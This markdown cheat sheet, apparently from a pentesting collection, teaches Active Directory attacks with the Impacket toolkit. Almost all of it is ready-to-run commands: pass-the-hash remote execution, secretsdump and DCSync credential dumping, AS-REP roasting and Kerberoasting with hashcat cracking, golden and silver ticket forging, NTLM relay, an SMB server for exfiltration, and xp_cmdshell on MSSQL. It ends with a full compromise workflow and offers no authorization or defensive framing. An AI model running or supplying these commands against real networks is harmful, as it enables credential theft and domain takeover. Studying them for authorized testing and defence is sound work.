# 🐍 Impacket - Python AD Attack Toolkit

```
  ██╗███╗   ███╗██████╗  █████╗  ██████╗██╗  ██╗███████╗████████╗
  ██║████╗ ████║██╔══██╗██╔══██╗██╔════╝██║ ██╔╝██╔════╝╚══██╔══╝
  ██║██╔████╔██║██████╔╝███████║██║     █████╔╝ █████╗     ██║   
  ██║██║╚██╔╝██║██╔═══╝ ██╔══██║██║     ██╔═██╗ ██╔══╝     ██║   
  ██║██║ ╚═╝ ██║██║     ██║  ██║╚██████╗██║  ██╗███████╗   ██║   
  ╚═╝╚═╝     ╚═╝╚═╝     ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝   ╚═╝   
              Python Network Protocol Toolkit
```

<p align="center">
  <img src="https://img.shields.io/badge/Impacket-Active_Directory-red?style=for-the-badge" alt="Impacket">
  <img src="https://img.shields.io/badge/Python-blue?style=for-the-badge" alt="Python">
  <img src="https://img.shields.io/badge/Kerberos-green?style=for-the-badge" alt="Kerberos">
</p>

---

## 📋 Table of Contents

- [What is Impacket](#-what-is-impacket)
- [Installation](#-installation)
- [Remote Execution](#-remote-execution)
- [Credential Dumping](#-credential-dumping)
- [Kerberos Attacks](#-kerberos-attacks)
- [SMB Attacks](#-smb-attacks)
- [MSSQL Attacks](#-mssql-attacks)
- [LDAP/AD Queries](#-ldapad-queries)
- [Quick Reference](#-quick-reference)

---

## 🎯 What is Impacket

**Impacket** is a collection of Python classes for working with network protocols. Essential for AD attacks:

- 🎫 **Kerberos** - AS-REP/Kerberoasting, ticket attacks
- 💻 **Remote Execution** - psexec, wmiexec, smbexec, atexec
- 🔓 **Credential Dumping** - secretsdump, DCSync
- 📁 **SMB** - File operations, relaying
- 🗄️ **MSSQL** - Database attacks

### Key Tools

| Tool | Description |
|------|-------------|
| **psexec.py** | Remote execution via SMB |
| **wmiexec.py** | Remote execution via WMI |
| **secretsdump.py** | Dump credentials/hashes |
| **GetNPUsers.py** | AS-REP roasting |
| **GetUserSPNs.py** | Kerberoasting |
| **ntlmrelayx.py** | NTLM relay attacks |
| **smbclient.py** | SMB client |
| **mssqlclient.py** | MSSQL client |

---

## 🚀 Installation

### Kali Linux

```bash
# Pre-installed in Kali
impacket-psexec --help

# Or install/update
pip3 install impacket
pip3 install impacket --upgrade
```

### From GitHub

```bash
git clone https://github.com/fortra/impacket.git
cd impacket
pip3 install .

# Or development install
pip3 install -e .
```

### Verify

```bash
# Check installation
impacket-psexec --help
python3 -c "import impacket; print(impacket.__version__)"
```

---

## 💻 Remote Execution

### psexec.py

```bash
# With password
impacket-psexec domain.local/user:password@10.10.10.10

# With NTLM hash (Pass-the-Hash)
impacket-psexec domain.local/user@10.10.10.10 -hashes :NTLMHASH

# Local admin
impacket-psexec administrator:password@10.10.10.10

# Execute command
impacket-psexec domain.local/user:password@10.10.10.10 "whoami"

# Target specific share
impacket-psexec domain.local/user:password@10.10.10.10 -target-ip 10.10.10.10
```

### wmiexec.py

```bash
# More stealthy than psexec
impacket-wmiexec domain.local/user:password@10.10.10.10

# With hash
impacket-wmiexec domain.local/user@10.10.10.10 -hashes :NTLMHASH

# Execute command
impacket-wmiexec domain.local/user:password@10.10.10.10 "whoami"

# No output (silent)
impacket-wmiexec domain.local/user:password@10.10.10.10 -nooutput "cmd /c calc.exe"
```

### smbexec.py

```bash
# Uses SMB for execution
impacket-smbexec domain.local/user:password@10.10.10.10

# With hash
impacket-smbexec domain.local/user@10.10.10.10 -hashes :NTLMHASH

# Specify share
impacket-smbexec domain.local/user:password@10.10.10.10 -share ADMIN$
```

### atexec.py

```bash
# Uses Task Scheduler
impacket-atexec domain.local/user:password@10.10.10.10 "whoami"

# With hash
impacket-atexec domain.local/user@10.10.10.10 -hashes :NTLMHASH "whoami"
```

### dcomexec.py

```bash
# Uses DCOM
impacket-dcomexec domain.local/user:password@10.10.10.10

# Different DCOM objects
impacket-dcomexec domain.local/user:password@10.10.10.10 -object MMC20
impacket-dcomexec domain.local/user:password@10.10.10.10 -object ShellWindows
impacket-dcomexec domain.local/user:password@10.10.10.10 -object ShellBrowserWindow
```

---

## 🔓 Credential Dumping

### secretsdump.py

```bash
# Dump from remote host
impacket-secretsdump domain.local/user:password@10.10.10.10

# Dump with hash (PtH)
impacket-secretsdump domain.local/user@10.10.10.10 -hashes :NTLMHASH

# Dump from DC (DCSync)
impacket-secretsdump domain.local/admin:password@DC01.domain.local

# Just DCSync specific user
impacket-secretsdump -just-dc-user krbtgt domain.local/admin:password@DC01.domain.local

# Just NTLM hashes (no Kerberos keys)
impacket-secretsdump -just-dc-ntlm domain.local/admin:password@DC01.domain.local

# Output to file
impacket-secretsdump domain.local/admin:password@10.10.10.10 -outputfile hashes
```

### DCSync Attack

```bash
# Full DCSync (dumps entire AD database)
impacket-secretsdump -just-dc domain.local/admin:password@DC01.domain.local

# DCSync specific user
impacket-secretsdump -just-dc-user Administrator domain.local/admin:password@DC01.domain.local

# DCSync krbtgt (for Golden Ticket)
impacket-secretsdump -just-dc-user krbtgt domain.local/admin:password@DC01.domain.local

# Output format: user:RID:LM:NTLM:::
```

### From Local Files

```bash
# From NTDS.dit + SYSTEM
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL

# From SAM + SYSTEM
impacket-secretsdump -sam SAM -system SYSTEM LOCAL

# From SECURITY + SYSTEM (LSA secrets)
impacket-secretsdump -security SECURITY -system SYSTEM LOCAL
```

---

## 🎫 Kerberos Attacks

### AS-REP Roasting (GetNPUsers.py)

```bash
# Find users without preauth
impacket-GetNPUsers domain.local/ -usersfile users.txt -no-pass

# With credentials
impacket-GetNPUsers domain.local/user:password -request

# DC IP specified
impacket-GetNPUsers domain.local/user:password -dc-ip 10.10.10.10 -request

# Output to file
impacket-GetNPUsers domain.local/user:password -request -outputfile asrep.txt

# Format for hashcat
impacket-GetNPUsers domain.local/user:password -request -format hashcat

# Format for john
impacket-GetNPUsers domain.local/user:password -request -format john
```

### Kerberoasting (GetUserSPNs.py)

```bash
# Find Kerberoastable users
impacket-GetUserSPNs domain.local/user:password

# Request TGS tickets
impacket-GetUserSPNs domain.local/user:password -request

# Output to file
impacket-GetUserSPNs domain.local/user:password -request -outputfile kerberoast.txt

# DC IP
impacket-GetUserSPNs domain.local/user:password -dc-ip 10.10.10.10 -request

# With hash
impacket-GetUserSPNs domain.local/user -hashes :NTLMHASH -request
```

### Cracking Kerberos Hashes

```bash
# AS-REP (hashcat mode 18200)
hashcat -m 18200 asrep.txt wordlist.txt

# TGS/Kerberoast (hashcat mode 13100)
hashcat -m 13100 kerberoast.txt wordlist.txt

# With john
john --wordlist=wordlist.txt asrep.txt
john --wordlist=wordlist.txt kerberoast.txt
```

### getTGT.py

```bash
# Request TGT with password
impacket-getTGT domain.local/user:password

# Request TGT with hash
impacket-getTGT domain.local/user -hashes :NTLMHASH

# Request TGT with AES key
impacket-getTGT domain.local/user -aesKey <AES256KEY>

# Saves to user.ccache
# Export for use:
export KRB5CCNAME=user.ccache
```

### ticketer.py (Golden/Silver Ticket)

```bash
# Golden Ticket
impacket-ticketer -nthash <KRBTGT_NTLM_HASH> -domain-sid S-1-5-21-... -domain domain.local Administrator

# Silver Ticket
impacket-ticketer -nthash <SERVICE_NTLM_HASH> -domain-sid S-1-5-21-... -domain domain.local -spn MSSQLSvc/target.domain.local:1433 Administrator

# Use the ticket
export KRB5CCNAME=Administrator.ccache
impacket-psexec domain.local/Administrator@target.domain.local -k -no-pass
```

---

## 📁 SMB Attacks

### smbclient.py

```bash
# Connect to share
impacket-smbclient domain.local/user:password@10.10.10.10

# List shares
# (inside smbclient)
shares

# Connect to specific share
use SHARE_NAME

# List files
ls

# Download file
get filename

# Upload file
put localfile

# Execute command
# (if you have write access to a share)
```

### smbserver.py

```bash
# Start SMB server (for exfiltration)
impacket-smbserver share /tmp/share

# With authentication
impacket-smbserver share /tmp/share -username user -password pass

# SMB2 support
impacket-smbserver share /tmp/share -smb2support
```

### ntlmrelayx.py

```bash
# Basic relay
impacket-ntlmrelayx -tf targets.txt

# Relay to SMB
impacket-ntlmrelayx -tf targets.txt -smb2support

# Relay and execute command
impacket-ntlmrelayx -tf targets.txt -c "whoami"

# Dump SAM on relay
impacket-ntlmrelayx -tf targets.txt -smb2support --sam

# Relay to LDAP
impacket-ntlmrelayx -t ldap://DC01.domain.local

# With Responder:
# 1. Edit Responder.conf, set SMB = Off, HTTP = Off
# 2. Run: responder -I eth0
# 3. Run: impacket-ntlmrelayx -tf targets.txt -smb2support
```

---

## 🗄️ MSSQL Attacks

### mssqlclient.py

```bash
# Connect with Windows auth
impacket-mssqlclient domain.local/user:password@10.10.10.10 -windows-auth

# Connect with SQL auth
impacket-mssqlclient sa:password@10.10.10.10

# With hash
impacket-mssqlclient domain.local/user@10.10.10.10 -hashes :NTLMHASH -windows-auth

# Connect to specific database
impacket-mssqlclient domain.local/user:password@10.10.10.10 -windows-auth -db master
```

### MSSQL Commands

```sql
-- Enable xp_cmdshell
enable_xp_cmdshell

-- Execute command
xp_cmdshell whoami

-- SQL query
SELECT * FROM master.sys.databases

-- Read file
SELECT * FROM OPENROWSET(BULK N'C:\Windows\System32\drivers\etc\hosts', SINGLE_CLOB) AS Contents
```

---

## 📂 LDAP/AD Queries

### GetADUsers.py

```bash
# List all users
impacket-GetADUsers domain.local/user:password -all

# Specific DC
impacket-GetADUsers domain.local/user:password -dc-ip 10.10.10.10 -all

# With hash
impacket-GetADUsers domain.local/user -hashes :NTLMHASH -all
```

### lookupsid.py

```bash
# Enumerate users via SID brute-force
impacket-lookupsid domain.local/user:password@10.10.10.10

# Specify SID range
impacket-lookupsid domain.local/user:password@10.10.10.10 20000
```

### findDelegation.py

```bash
# Find delegation settings
impacket-findDelegation domain.local/user:password -dc-ip 10.10.10.10
```

---

## 📊 Quick Reference

### Authentication Options

| Option | Description |
|--------|-------------|
| `user:password` | Password authentication |
| `-hashes :NTLM` | NTLM hash (Pass-the-Hash) |
| `-hashes LM:NTLM` | LM:NTLM hash |
| `-aesKey KEY` | AES256 key |
| `-k -no-pass` | Kerberos with ccache |

### Common Options

| Option | Description |
|--------|-------------|
| `-dc-ip IP` | Domain Controller IP |
| `-target-ip IP` | Target IP |
| `-debug` | Enable debug output |

### Remote Execution Summary

| Tool | Method | Stealth |
|------|--------|---------|
| psexec.py | SMB + Service | Low |
| wmiexec.py | WMI | Medium |
| smbexec.py | SMB | Low |
| atexec.py | Task Scheduler | High |
| dcomexec.py | DCOM | Medium |

### Attack Workflow

```bash
# 1. Enumerate users (AS-REP Roast)
impacket-GetNPUsers domain.local/ -usersfile users.txt -no-pass

# 2. Kerberoast
impacket-GetUserSPNs domain.local/user:password -request

# 3. Crack hashes
hashcat -m 18200 asrep.txt rockyou.txt
hashcat -m 13100 kerberoast.txt rockyou.txt

# 4. PtH or use password
impacket-psexec domain.local/admin:password@10.10.10.10

# 5. Dump creds
impacket-secretsdump domain.local/admin:password@DC01

# 6. DCSync for all hashes
impacket-secretsdump -just-dc domain.local/admin:password@DC01
```

---

## 📚 Resources

- [Impacket GitHub](https://github.com/fortra/impacket)
- [Impacket Examples](https://github.com/fortra/impacket/tree/master/examples)
- [Wiki](https://github.com/fortra/impacket/wiki)

### Related Cheatsheets
- [BloodHound](../BloodHound/README.md)
- [Mimikatz](../Mimikatz/README.md)
- [Hashcat](../Hashcat/README.md)

---

<p align="center">
  <b>🐍 Master AD Attacks with Python!</b><br>
  <i>Impacket - The pentester's essential toolkit</i>
</p>
